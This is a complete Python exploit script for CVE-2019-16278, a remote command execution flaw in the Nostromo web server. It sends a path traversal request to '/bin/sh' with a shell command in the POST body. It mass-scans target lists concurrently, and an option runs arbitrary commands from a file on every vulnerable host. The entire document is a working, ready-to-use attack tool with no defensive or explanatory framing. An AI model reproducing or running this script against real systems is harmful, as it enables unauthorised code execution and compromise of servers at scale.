
from gevent import monkey;monkey.patch_all()
from multiprocessing import Process
from colorama import init,Fore
from http import client
import gevent
import optparse
import requests
import sys
import os
import time

init(wrap=True)
class Exploit(object):
    def __init__(self):
        self.headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'}
        self.data='''echo
echo
echo haq5201314 2>&1
                '''
        self.path='/.%0d./.%0d./.%0d./.%0d./bin/sh'
        self.djcs=[]
        self.xcs=[]
        self.calc=0

    def scan(self,url,id):
        client.HTTPConnection._http_vsn=10
        client.HTTPConnection._http_vsn_str='HTTP/1.0'
        try:
            rqt=requests.post(url=url+self.path,headers=self.headers,data=self.data)
            if id==1:
                print(Fore.YELLOW+'[+] '+Fore.WHITE+'URL:{}'.format(rqt.url))
                print(rqt.text)
            else:
                if 'haq5201314' in rqt.text:
                    print(Fore.GREEN+'[+] '+Fore.WHITE+' CVE-2019-16278:{}'.format(rqt.url))
                else:
                    print(Fore.RED+'[-] '+Fore.WHITE+'Not Found:{}'.format(rqt.url))
        except Exception as r:
            print(Fore.RED+'[-]'+Fore.WHITE+' Error:{}'.format(r))

    def optioon(self):
        usage='python exp.py [option] [url/file]'
        args=optparse.OptionParser(usage)
        args.add_option('-u',dest='url',help='set url')
        args.add_option('-f',dest='file',help='set file')
        args.add_option('-p',dest='exp',help='set exp',action='store_true')
        (options,arg)=args.parse_args()
        if options.url:
            self.scan(options.url,0)
        elif options.file and options.exp:
            if os.path.exists('exp.txt'):
                pass
            else:
                sys.exit(Fore.RED+'[-] '+Fore.WHITE+'Not Found exp.txt,not load exploit.....')

            self.data = '''echo
echo
{} 2>&1'''.format(open('exp.txt','r',encoding='utf-8').read())
            self.djc(options.file,1)
        elif options.file:
            self.djc(options.file,0)
        else:
            args.print_help()

    def xc(self,rw,id):
        [self.xcs.append(gevent.spawn(self.scan,x,id)) for x in rw]
        gevent.joinall(self.xcs)

    def djc(self,file,id):
        if os.path.exists(file):
            print(Fore.YELLOW+'[+] '+Fore.WHITE+'Found File:{}'.format(file))
        else:
            sys.exit(Fore.RED+'[-] '+Fore.WHITE+'Not Found file:{}'.format(file))

        dk=open(file,'r',encoding='utf-8')
        for x in dk.readlines():
            if self.calc==100:
                p=Process(target=self.xc,args=(self.djcs,id))
                p.start()
                self.calc=0
                self.djcs.clear()
            time.sleep(0.01)
            data="".join(x.split('\n'))
            self.djcs.append(data)
            self.calc+=1

        if len(self.djcs)>0:
            p = Process(target=self.xc, args=(self.djcs,id))
            p.start()

if __name__ == '__main__':
    obj=Exploit()
    obj.optioon()
